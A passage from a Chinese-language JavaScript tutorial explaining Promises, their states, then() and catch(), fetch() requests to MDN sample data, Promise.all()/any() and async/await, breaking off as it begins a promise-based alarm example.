&#125;<br>&#125;);<br>myPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>&#125;);<br>myPromise.<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="7-1-概述"><a href="#7-1-概述" class="headerlink" title="7.1 概述"></a>7.1 概述</h3><p>Promise 是一个对象，也是一个构造函数。</p><p>Promise 的设计思想是，所有异步任务都返回一个 Promise 实例。Promise 实例有一个<code>then</code>方法，用来指定下一步的回调函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(f1);<br>p1.<span class="hljs-title function_">then</span>(f2);<br><span class="hljs-comment">//f1异步操作完成后，执行f2</span><br></code></pre></td></tr></table></figure><p>传统写法需要把f2作为函数调入f1，比如<code>f1(f2)</code>。</p><p>Promise使得<code>f1</code>和<code>f2</code>成了链式写法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 传统写法</span><br><span class="hljs-title function_">step1</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">value1</span>) &#123;<br>  <span class="hljs-title function_">step2</span>(value1, <span class="hljs-keyword">function</span>(<span class="hljs-params">value2</span>) &#123;<br>    <span class="hljs-title function_">step3</span>(value2, <span class="hljs-keyword">function</span>(<span class="hljs-params">value3</span>) &#123;<br>      <span class="hljs-title function_">step4</span>(value3, <span class="hljs-keyword">function</span>(<span class="hljs-params">value4</span>) &#123;<br>        <span class="hljs-comment">// ...</span><br>      &#125;);<br>    &#125;);<br>  &#125;);<br>&#125;);<br><br><span class="hljs-comment">// Promise 的写法</span><br>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(step1))<br>  .<span class="hljs-title function_">then</span>(step2)<br>  .<span class="hljs-title function_">then</span>(step3)<br>  .<span class="hljs-title function_">then</span>(step4);<br></code></pre></td></tr></table></figure><p>采用Promise以后，程序流程变得十分清晰易读。</p><h3 id="7-2-Promise对象的状态"><a href="#7-2-Promise对象的状态" class="headerlink" title="7.2 Promise对象的状态"></a>7.2 Promise对象的状态</h3><p>Promise对象通过自身的状态，来控制异步操作。</p><p>Promise实例具有<strong>三种状态</strong>：</p><p>( you did not add a way to complete the promise. )</p><ul><li><p><strong>待定（pending）</strong></p><p>初始状态，既没有被兑现，也没有被拒绝。</p><p>这是调用 <code>fetch()</code> 返回 Promise 时的状态，此时请求还在进行中。</p></li></ul><p>(given to the promise argument are used to do this)</p><ul><li><p><strong>已兑现（fulfilled）</strong></p><p>意味着操作成功完成。当 Promise 完成时，它的 <code>then()</code> 处理函数被调用。</p></li><li><p><strong>已拒绝（rejected）</strong></p><p>意味着操作失败。当一个 Promise 失败时，它的 <code>catch()</code> 处理函数被调用。</p></li></ul><p>有时候用 <strong>已敲定(settled)<strong>来同时表现</strong>fulfilled</strong>和<strong>rejected</strong>。</p><p>一旦状态发生变化，就凝固了，不会再有新的状态变化，这也是Promise名字的由来。</p><p>因此Promise的最终结果只有两种：</p><ul><li>异步操作成功，Promise 实例传回一个值（value），状态变为<code>fulfilled</code>。</li><li>异步操作失败，Promise 实例抛出一个错误（error），状态变为<code>rejected</code>。</li></ul><p>更多术语细节<a href="https://thenewtoys.dev/blog/2021/02/08/lets-talk-about-how-to-talk-about-promises/">详见此</a>。</p><h3 id="7-3-Promise构造函数"><a href="#7-3-Promise构造函数" class="headerlink" title="7.3 Promise构造函数"></a>7.3 Promise构造函数</h3><p>JavaScript 提供原生的Promise构造函数，用来生成 <strong>Promise</strong> 实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) &#123;<br>  <span class="hljs-comment">// ... some code</span><br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-comment">/* 异步操作成功 */</span>)&#123;<br>    <span class="hljs-title function_">resolve</span>(value); <span class="hljs-comment">//解决时调用</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">reject</span>(error);  <span class="hljs-comment">//拒绝时调用</span><br>  &#125;<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>上面代码中，<code>Promise</code>构造函数接受一个函数作为参数，该函数的两个参数分别是<code>resolve</code>和<code>reject</code>。它们是两个函数，由 JavaScript 引擎提供，不用自己实现。</p><p><code>resolve</code>函数的作用是，将<code>Promise</code>实例的状态从“未完成”变为“成功”（即从<code>pending</code>变为<code>fulfilled</code>），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去。</p><p><code>reject</code>函数的作用是，将<code>Promise</code>实例的状态从“未完成”变为“失败”（即从<code>pending</code>变为<code>rejected</code>），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。</p><p>当通过 <code>new</code> 关键字调用 <code>Promise</code> 构造函数时，它会返回一个 Promise 对象。当 <code>resolutionFunc</code> 或者 <code>rejectionFunc</code> 被调用时，该 Promise 对象就会变为<em>已解决</em>（resolved）。（注意：如果你调用 <code>resolveFunc</code> 或 <code>rejectFunc</code> 并传入另一个 Promise 对象作为参数，可以说该 Promise 对象“已解决”，但仍未“敲定（settled）”。）</p><p>例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">timeout</span>(<span class="hljs-params">ms</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">setTimeout</span>(resolve, ms, <span class="hljs-string">&#x27;done&#x27;</span>);<br>  &#125;);<br>&#125;<br><span class="hljs-title function_">timeout</span>(<span class="hljs-number">100</span>)<span class="hljs-comment">//返回一个Promise实例</span><br><span class="hljs-comment">//100毫秒以后，该实例的状态变为fulfilled。</span><br><br></code></pre></td></tr></table></figure><h3 id="7-4-Promise-prototype-then"><a href="#7-4-Promise-prototype-then" class="headerlink" title="7.4 Promise.prototype.then()"></a>7.4 Promise.prototype.then()</h3><p>Promise 实例的<code>then</code>方法，用来<strong>添加回调函数</strong>。它立即返回一个等效的Promise对象，允许你链接到其他 Promise 方法，从而实现链式调用。</p><p><code>then</code>方法最多接受两个回调函数。<code>then(onFulfilled, onRejected)</code></p><ul><li>第一个是异步操作成功时（变为<code>fulfilled</code>状态）的回调函数</li><li>第二个是异步操作失败（变为<code>rejected</code>）时的回调函数（该参数可以省略）。一旦状态改变，就调用相应的回调函数。</li></ul><p>then方法可以链式使用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript">p1<br>  .<span class="hljs-title function_">then</span>(step1)<br>  .<span class="hljs-title function_">then</span>(step2)<br>  .<span class="hljs-title function_">then</span>(step3)<br>  .<span class="hljs-title function_">then</span>(<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>,<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span><br>  );<br><br><span class="hljs-comment">//p1后面有4个then，意味着依次有4个回调函数。只要前一步变为fulfilled，就会依次执行紧跟在后面的回调函数</span><br><span class="hljs-comment">//最后一个then方法，回调函数是console.log和console.error，用法上有一点重要的区别。</span><br><span class="hljs-comment">//console.log只显示step3的返回值，而console.error可以显示p1、step1、step2、step3之中任意一个发生的错误。</span><br><span class="hljs-comment">//举例来说，如果step1的状态变为rejected，那么step2和step3都不会执行了（因为它们是resolved的回调函数）。</span><br></code></pre></td></tr></table></figure><p><strong>then用法的差别</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 写法一：调用f3回调函数的参数，是f2函数的运行结果</span><br><span class="hljs-title function_">f1</span>().<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2</span>();<br>&#125;).<span class="hljs-title function_">then</span>(f3);<br><br><span class="hljs-comment">// 写法二：f3回调函数的参数是undefined</span><br><span class="hljs-title function_">f1</span>().<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">f2</span>();<br>  <span class="hljs-keyword">return</span>;<br>&#125;).<span class="hljs-title function_">then</span>(f3);<br><br><span class="hljs-comment">// 写法三：f3回调函数的参数，是f2函数返回的函数的运行结果</span><br><span class="hljs-title function_">f1</span>().<span class="hljs-title function_">then</span>(<span class="hljs-title function_">f2</span>())<br>  .<span class="hljs-title function_">then</span>(f3);<br><br><br><span class="hljs-comment">// 写法四：f2会收到f1返回的结果，其他和写法1相同</span><br><span class="hljs-title function_">f1</span>().<span class="hljs-title function_">then</span>(f2)<br>  .<span class="hljs-title function_">then</span>(f3);<br></code></pre></td></tr></table></figure><h2 id="8-使用Promise"><a href="#8-使用Promise" class="headerlink" title="8.使用Promise"></a>8.使用Promise</h2><h3 id="8-1使用-fetch-API"><a href="#8-1使用-fetch-API" class="headerlink" title="8.1使用 fetch() API"></a>8.1使用 fetch() API</h3><p>全局的 <strong>fetch()</strong> 方法用于<strong>发起获取资源的请求</strong>。它返回一个 promise，这个 promise 会在请求响应后被 resolve，并传回 Response 对象。</p><p><strong>fetch() API</strong>是一个现代的、基于 Promise 的、用于替代 XMLHttpRequest 的方法。</p><p>测试地址：<a href="https://example.org/">https://example.org/</a></p><p>例子：向服务器发出一个 <strong>HTTP 请求</strong>，从服务器上获得一个 JSON 文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span>,<br>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fetchPromise);<br><br>fetchPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`已收到响应：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>&#125;);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;已发送请求……&quot;</span>);<br></code></pre></td></tr></table></figure><ol><li><p>调用fetch() API，并将返回值赋给 <code>fetchPromise</code> 变量。</p></li><li><p>紧接着，输出 <code>fetchPromise</code> 变量</p><p>输出结果应该像这样：<code>Promise &#123; &lt;state&gt;: &quot;pending&quot; &#125;</code>。</p><p>这告诉我们有一个 <code>Promise</code> 对象，它有一个 <code>state</code>属性，值是 <code>&quot;pending&quot;</code>。<code>&quot;pending&quot;</code> 状态意味着操作<strong>仍在进行中</strong>。</p><p>本案例的输出结果为：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">Promise</span> &#123; &lt;state&gt;: <span class="hljs-string">&quot;pending&quot;</span> &#125;<br>已发送请求……<br>已收到响应：<span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>注意，<code>已发送请求……</code> 的消息在我们收到响应之前就被输出了。</p><p>与同步函数不同，<code>fetch()</code> 在请求仍在进行时返回，这使我们的程序能够保持响应性。响应显示了 <code>200</code>（OK）的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">状态码</a>，意味着我们的请求成功了。</p><ul><li><p>响应状态码被分为五大类</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">信息响应 (<span class="hljs-number">100–199</span>)<br>成功响应 (<span class="hljs-number">200–299</span>)<br>重定向消息 (<span class="hljs-number">300–399</span>)<br>客户端错误响应 (<span class="hljs-number">400–499</span>)<br>服务端错误响应 (<span class="hljs-number">500–599</span>)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>将一个处理函数传递给 Promise 的 <strong><code>then()</code></strong> 方法。当（如果）获取操作成功时，Promise 将调用我们的处理函数，传入一个包含服务器的响应的 <code>Response</code> 对象。</p></li><li><p>输出一条信息，说明我们已经发送了这个请求。</p></li></ol><h3 id="8-2-链式使用Promise"><a href="#8-2-链式使用Promise" class="headerlink" title="8.2 链式使用Promise"></a>8.2 链式使用Promise</h3><p>在你通过 <strong>fetch() API</strong> 得到一个 Response 对象的时候，你需要调用另一个函数来获取响应数据。</p><p>这次，我们想获得 JSON 格式的响应数据，所以我们会调用 Response 对象的 json() 方法。</p><p>事实上，json() 也是异步的，因此我们必须连续调用两个异步函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span>,<br>);<br><br>fetchPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> jsonPromise = response.<span class="hljs-title function_">json</span>();<br>  jsonPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">json</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>上面的代码可以改写为<strong>Promise链</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span>,<br>);<br><br>fetchPromise<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">json</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br>  &#125;);<br><br></code></pre></td></tr></table></figure><h3 id="8-3-错误捕获"><a href="#8-3-错误捕获" class="headerlink" title="8.3 错误捕获"></a>8.3 错误捕获</h3><p>Promise 对象提供了一个<code>catch()</code>方法来支持错误处理。</p><p>当异步操作<strong>成功</strong>时，传递给 <code>then()</code> 的处理函数被调用，而当异步操作<strong>失败</strong>时，传递给 <code>catch()</code> 的处理函数被调用。</p><p>如果将 <code>catch()</code> 添加到 Promise 链的末尾，它就可以在任何异步函数失败时被调用。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;bad-scheme://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span>,<br>);<br><br>fetchPromise<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP 请求错误：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">json</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`无法获取产品列表：<span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>  &#125;);<br><br></code></pre></td></tr></table></figure><h3 id="8-4-合并使用多个Promise"><a href="#8-4-合并使用多个Promise" class="headerlink" title="8.4 合并使用多个Promise"></a>8.4 合并使用多个Promise</h3><p>有时候可能需要合并多个异步函数的调用，Promise API 为解决这一问题提供了帮助。</p><p>有时需要所有的Promise都得到实现，但它们间并不互相依赖。</p><p>在这种情况下，将它们一起启动，然后在它们全部被兑现（fulfilled）后得到通知会更有效率。</p><p>这时可以使用**Promise.all()**方法。</p><ul><li><p><strong>Promise.all()</strong> 静态方法接受一个 <strong>Promise 可迭代对象</strong>作为输入，并返回<strong>一个 Promise</strong>。</p><p>当<strong>所有</strong>输入的 <strong>Promise 都被兑现时</strong>，<strong>返回的 Promise 也将被兑现</strong>（即使传入的是一个空的可迭代对象），并返回一个包含所有兑现值的数组。</p><p>如果输入的<strong>任何 Promise 被拒绝</strong>，则<strong>返回的 Promise 将被拒绝</strong>，并带有第一个被拒绝的原因。</p></li></ul><p>例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fetchPromise1 = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span>,<br>);<br><span class="hljs-keyword">const</span> fetchPromise2 = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/not-found&quot;</span>,<br>);<br><span class="hljs-keyword">const</span> fetchPromise3 = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/oojs/json/superheroes.json&quot;</span>,<br>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([fetchPromise1, fetchPromise2, fetchPromise3])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">responses</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> response <span class="hljs-keyword">of</span> responses) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;response.url&#125;</span>：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`获取失败：<span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>向三个不同的url发出fetch请求，全部兑现将输出每个请求的响应状态，如果有任何一个被拒绝，就输出失败的情况。</p><p>而只关心一组Promise中任意一个Promise的执行，可以使用 **Promise.any()**。</p><ul><li><p><strong>Promise.any()</strong> 静态方法将一个 Promise 可迭代对象作为输入，并返回一个 Promise。</p><p>当输入的<strong>任何一个</strong> Promise <strong>兑现</strong>时，这个<strong>返回的 Promise 将会兑现</strong>，并返回第一个兑现的值。</p><p>当<strong>所有输入</strong> Promise 都被<strong>拒绝</strong>（包括传递了空的可迭代对象）时，它会以一个包含拒绝原因数组的 AggregateError 拒绝。</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fetchPromise1 = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span>,<br>);<br><span class="hljs-keyword">const</span> fetchPromise2 = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/not-found&quot;</span>,<br>);<br><span class="hljs-keyword">const</span> fetchPromise3 = <span class="hljs-title function_">fetch</span>(<br>  <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/oojs/json/superheroes.json&quot;</span>,<br>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">any</span>([fetchPromise1, fetchPromise2, fetchPromise3])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;response.url&#125;</span>：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`获取失败：<span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>但在这种情况下，我们无法预测哪个请求会先被兑现。</p><h3 id="8-5-async-和-await"><a href="#8-5-async-和-await" class="headerlink" title="8.5 async 和 await"></a>8.5 async 和 await</h3><p><strong>async</strong> 和 <strong>await</strong> 关键字让我们可以用一种更简洁的方式写出基于 Promise 的异步行为，而无需刻意地链式调用 promise。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 这是一个异步函数</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>async</strong> 函数是使用async关键字声明的函数。async 函数是 <u>AsyncFunction 构造函数的实例</u>，并且其中允许使用 await 关键字。</li><li><strong>await</strong> 用于等待一个 Promise 兑现并获取它兑现之后的值。</li></ul><p>例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchProducts</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 在这一行之后，我们的函数将等待 `fetch()` 调用完成</span><br>    <span class="hljs-comment">// 调用 `fetch()` 将返回一个“响应”或抛出一个错误</span><br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<br>      <span class="hljs-string">&quot;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&quot;</span>,<br>    );<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP 请求错误：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <span class="hljs-comment">// 在这一行之后，我们的函数将等待 `response.json()` 的调用完成</span><br>    <span class="hljs-comment">// `response.json()` 调用将返回 JSON 对象或抛出一个错误</span><br>    <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`无法获取产品列表：<span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">fetchProducts</span>();<br></code></pre></td></tr></table></figure><p>这里我们调用 await fetch()，得到的并不是 Promise，而是一个完整的 Response 对象。就好像 fetch() 是一个同步函数一样。甚至可以使用try catch来处理错误。</p><h2 id="9-实现基于Promise的API"><a href="#9-实现基于Promise的API" class="headerlink" title="9.实现基于Promise的API"></a>9.实现基于Promise的API</h2><blockquote><p>通常情况下，当你实现一个基于 promise 的 API 时，你会使用事件、普通回调，或者消息传递模型来包裹一个异步操作。你将会使用一个 <code>Promise</code> 对象来合理的处理操作的成功或者失败。</p></blockquote><p>实现一个基于promise的alarm API。</p><p>以<u>被唤醒人的名字</u>和一个在人被唤醒前以毫秒为单位的<u>延迟</u>作为参数。</p><p>在延迟之后，本函数将会发送一个包含需要被唤醒人名字的 “Wake up!” 消息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span 